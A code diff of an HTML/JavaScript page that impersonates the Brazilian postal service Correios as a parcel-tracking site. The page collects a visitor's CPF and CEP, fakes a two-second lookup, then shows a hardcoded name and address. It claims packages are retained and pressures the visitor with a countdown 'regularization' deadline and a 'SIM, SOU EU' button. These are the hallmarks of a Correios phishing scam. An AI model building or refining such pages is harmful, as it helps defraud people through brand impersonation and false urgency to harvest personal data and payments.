@@ -3,137 +3,111 @@
 
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <link rel="stylesheet" href="css/bootstrap.css" />
-  <link rel="stylesheet" href="css/app.css" />
-  <link rel="stylesheet" href="css/yellow.css" />
-  <title>Correios | Rastreio</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Rastreamento de Encomenda - Correios</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" />
   <style>
-    @keyframes pulsar {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
-    }
-    #consultar-btn { animation: pulsar 1s infinite; }
-    .spinner {
-      width: 50px; height: 50px;
-      border: 5px solid rgba(0, 0, 0, 0.1);
-      border-top-color: #007bff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    main { max-width: 1000px; margin: 2rem auto; padding: 0 1rem; }
-    #resultado {
-      background: #fff;
-      padding: 20px 25px;
-      margin: 30px auto;
-      border-radius: 8px;
+    body {
+      background-color: #f1f1f1;
+      font-family: Arial, sans-serif;
+      color: #003157;
       box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-      max-width: 420px;
-      width: 100%;
-      font-size: 14px;
-      font-weight: 400;
-      color: #003157;
-      text-align: center;
+      text-align: left;
     }
+
     #resultado h2 {
-      font-size: 16px;
-      font-weight: 700;
-      margin-bottom: 16px;
+      font-size: 1.8rem;
+      font-weight: bold;
       color: #003157;
     }
-    #resultado p { margin: 6px 0; line-height: 1.3; }
-    #resultado p span.label {
-      font-weight: 700;
-      margin-right: 6px;
-      color: #003157;
+
+    #resultado p {
+      margin: 0.5rem 0;
     }
-    #res-rua, #res-bairro {
+
+    /* Bairro e Rua em branco com fundo azul escuro */
+    #res-rua,
+    #res-bairro {
       color: white !important;
       background-color: #003157;
       padding: 2px 6px;
       border-radius: 4px;
       display: inline-block;
-      margin-left: 4px;
     }
+
+    /* Prazo centralizado e vermelho */
     #prazo-container {
-      margin-top: 18px;
+      margin-top: 1.5rem;
+      text-align: center;
       font-weight: 700;
-      font-size: 14px;
+      font-size: 1.3rem;
       color: red;
     }
-    #countdown {
-      font-weight: 400;
-      margin-top: 6px;
-      font-size: 13px;
-      color: red;
-    }
+
+    /* Botão azul "SIM, SOU EU" */
     #btn-sim-sou-eu {
-      margin-top: 20px;
+      margin-top: 2rem;
+      display: block;
       background-color: #007bff;
-      border: none;
       color: white;
-      padding: 10px 25px;
-      font-size: 14px;
+      border: none;
+      padding: 12px 25px;
+      font-size: 1.1rem;
       font-weight: 700;
       border-radius: 6px;
       cursor: pointer;
+      text-align: center;
       width: 100%;
-      max-width: 240px;
+      max-width: 250px;
       margin-left: auto;
       margin-right: auto;
-      display: block;
       transition: background-color 0.3s ease;
     }
-    #btn-sim-sou-eu:hover { background-color: #0056b3; }
+
+    #btn-sim-sou-eu:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
 
 <body>
-  <main>
-    <section id="tela-formulario">
-      <h1>Rastreamento</h1>
-      <form id="form-rastreamento">
-        <div>
-          <label>CPF:</label>
-          <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required />
-        </div>
-        <div>
-          <label>CEP:</label>
-          <input type="text" id="cep" placeholder="00000-000" maxlength="9" required />
-        </div>
-        <div id="botao-container">
-          <button type="submit" id="consultar-btn">Consultar</button>
-        </div>
-        <div id="loading-container" style="display:none;">
-          <p>Consultando seus dados...</p>
-          <div class="spinner"></div>
-        </div>
-      </form>
-    </section>
-
-    <section id="resultado" style="display:none;">
-      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
-      <p><span class="label">Nome:</span> <span id="res-nome"></span></p>
-      <p><span class="label">CPF:</span> <span id="res-cpf"></span></p>
-      <p><span class="label">Nascimento:</span> <span id="res-nascimento"></span></p>
-      <p><span class="label">CEP:</span> <span id="res-cep"></span></p>
-      <p><span class="label">Rua:</span> <span id="res-rua"></span></p>
-      <p><span class="label">Bairro:</span> <span id="res-bairro"></span></p>
-      <p><span class="label">Cidade:</span> <span id="res-cidade"></span></p>
-      <p><span class="label">Estado:</span> <span id="res-estado"></span></p>
-
-      <div id="prazo-container">
-        Prazo para Regularização: <span id="res-prazo"></span>
-        <div id="countdown"></div>
+  <section id="tela-formulario" class="container py-4">
+    <h2>Rastreamento de Encomenda - Correios</h2>
+    <form id="form-rastreamento">
+      <div class="mb-3">
+        <label for="cpf">CPF:</label>
+        <input type="text" id="cpf" name="cpf" class="form-control" required />
       </div>
+      <div class="mb-3">
+        <label for="cep">CEP:</label>
+        <input type="text" id="cep" name="cep" class="form-control" required />
+      </div>
+      <button type="submit" class="btn btn-primary">Consultar</button>
+    </form>
+  </section>
 
-      <button id="btn-sim-sou-eu">SIM, SOU EU</button>
-    </section>
-  </main>
+  <section id="loading-container" class="container py-4" style="display: none;">
+    <p>Consultando dados... Por favor, aguarde.</p>
+  </section>
+
+  <section id="resultado" class="container py-4" style="display: none;">
+    <h2>Resultado da Consulta</h2>
+    <p><span>Nome:</span> <span id="res-nome"></span></p>
+    <p><span>CPF:</span> <span id="res-cpf"></span></p>
+    <p><span>CEP:</span> <span id="res-cep"></span></p>
+    <p><span>Rua:</span> <span id="res-rua"></span></p>
+    <p><span>Bairro:</span> <span id="res-bairro"></span></p>
+    <p><span>Cidade:</span> <span id="res-cidade"></span></p>
+    <p><span>Estado:</span> <span id="res-estado"></span></p>
+
+    <!-- Prazo com contagem regressiva -->
+    <div id="prazo-container">
+      Prazo para Regularização: <span id="res-prazo"></span><br />
+      <span id="countdown"></span>
+    </div>
+
+    <button id="btn-sim-sou-eu" type="button">SIM, SOU EU</button>
+  </section>
 
   <script>
     function formatarCPF(cpf) {
@@ -144,77 +118,88 @@
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    function calcularPrazo(dias) {
-      const data = new Date();
-      data.setDate(data.getDate() + dias);
-      const dd = String(data.getDate()).padStart(2, '0');
-      const mm = String(data.getMonth() + 1).padStart(2, '0');
-      const yyyy = data.getFullYear();
-      return `${dd}/${mm}/${yyyy} às 23:59`;
+    function formatarPrazo(dataBase, diasAdicionar, horas, minutos) {
+      const prazo = new Date(dataBase);
+      prazo.setDate(prazo.getDate() + diasAdicionar);
+      prazo.setHours(horas);
+      prazo.setMinutes(minutos);
+      prazo.setSeconds(0);
+
+      const dd = prazo.getDate().toString().padStart(2, "0");
+      const mm = (prazo.getMonth() + 1).toString().padStart(2, "0");
+      const yyyy = prazo.getFullYear();
+      const hh = prazo.getHours().toString().padStart(2, "0");
+      const min = prazo.getMinutes().toString().padStart(2, "0");
+
+      return {
+        text: `${dd}/${mm}/${yyyy} às ${hh}:${min}`,
+        dateObj: prazo
+      };
     }
 
-    let prazoFinal;
+    function atualizarContagem(prazoDate) {
+      const now = new Date().getTime();
+      const distance = prazoDate - now;
 
-    function iniciarCountdown() {
-      const countEl = document.getElementById("countdown");
-      const prazo = prazoFinal.getTime();
-
-      const interval = setInterval(() => {
-        const agora = new Date().getTime();
-        const dist = prazo - agora;
-        if (dist <= 0) {
-          countEl.textContent = "Prazo expirado!";
-          clearInterval(interval);
-        } else {
-          const dias = Math.floor(dist / (1000 * 60 * 60 * 24));
-          const horas = Math.floor((dist % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-          const minutos = Math.floor((dist % (1000 * 60 * 60)) / (1000 * 60));
-          const segundos = Math.floor((dist % (1000 * 60)) / 1000);
-          countEl.textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
-        }
-      }, 1000);
-    }
-
-    document.getElementById("form-rastreamento").addEventListener("submit", async function (e) {
-      e.preventDefault();
-      const cpf = document.getElementById("cpf").value.replace(/\D/g, "");
-      const cep = document.getElementById("cep").value.replace(/\D/g, "");
-
-      if (cpf.length !== 11 || cep.length !== 8) {
-        alert("CPF ou CEP inválido.");
+      if (distance < 0) {
+        document.getElementById("countdown").textContent = "Prazo expirado!";
         return;
       }
 
-      document.getElementById("botao-container").style.display = "none";
+      const dias = Math.floor(distance / (1000 * 60 * 60 * 24));
+      const horas = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutos = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((distance % (1000 * 60)) / 1000);
+
+      document.getElementById("countdown").textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
+    }
+
+    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      const cpfRaw = document.getElementById("cpf").value.replace(/\D/g, "");
+      const cepRaw = document.getElementById("cep").value.replace(/\D/g, "");
+
       document.getElementById("loading-container").style.display = "block";
+      document.getElementById("resultado").style.display = "none";
 
-      await new Promise(r => setTimeout(r, 2000));
+      // Simula delay de 2 segundos (substitua por sua consulta real ao backend)
+      await new Promise((resolve) => setTimeout(resolve, 2000));
 
-      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
-      document.getElementById("res-cpf").textContent = formatarCPF(cpf);
-      document.getElementById("res-nascimento").textContent = "27/01/1985";
-      document.getElementById("res-cep").textContent = formatarCEP(cep);
-      document.getElementById("res-rua").textContent = "Rua das Acácias";
-      document.getElementById("res-bairro").textContent = "Centro";
-      document.getElementById("res-cidade").textContent = "Porciúncula";
-      document.getElementById("res-estado").textContent = "RJ";
+      const prazoData = formatarPrazo(new Date(), 10, 23, 59);
 
-      const prazoTexto = calcularPrazo(10);
-      document.getElementById("res-prazo").textContent = prazoTexto;
+      const dadosPessoa = {
+        nome: "Rosiane Oliveira Da Silva",
+        cpf: formatarCPF(cpfRaw),
+        cep: formatarCEP(cepRaw),
+        rua: "Rua das Flores",
+        bairro: "Centro",
+        cidade: "Porciúncula",
+        estado: "RJ",
+        prazoRegularizacaoText: prazoData.text,
+        prazoRegularizacaoDate: prazoData.dateObj,
+      };
 
-      prazoFinal = new Date();
-      prazoFinal.setDate(prazoFinal.getDate() + 10);
-      prazoFinal.setHours(23);
-      prazoFinal.setMinutes(59);
-      prazoFinal.setSeconds(0);
+      document.getElementById("res-nome").textContent = dadosPessoa.nome;
+      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+      document.getElementById("res-cep").textContent = dadosPessoa.cep;
+      document.getElementById("res-rua").textContent = dadosPessoa.rua;
+      document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
+      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+      document.getElementById("res-estado").textContent = dadosPessoa.estado;
+      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacaoText;
 
-      iniciarCountdown();
-
-      document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("loading-container").style.display = "none";
+      document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("resultado").style.display = "block";
+
+      atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
+      setInterval(() => {
+        atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
+      }, 1000);
     });
   </script>
 </body>
 
 </html>
+
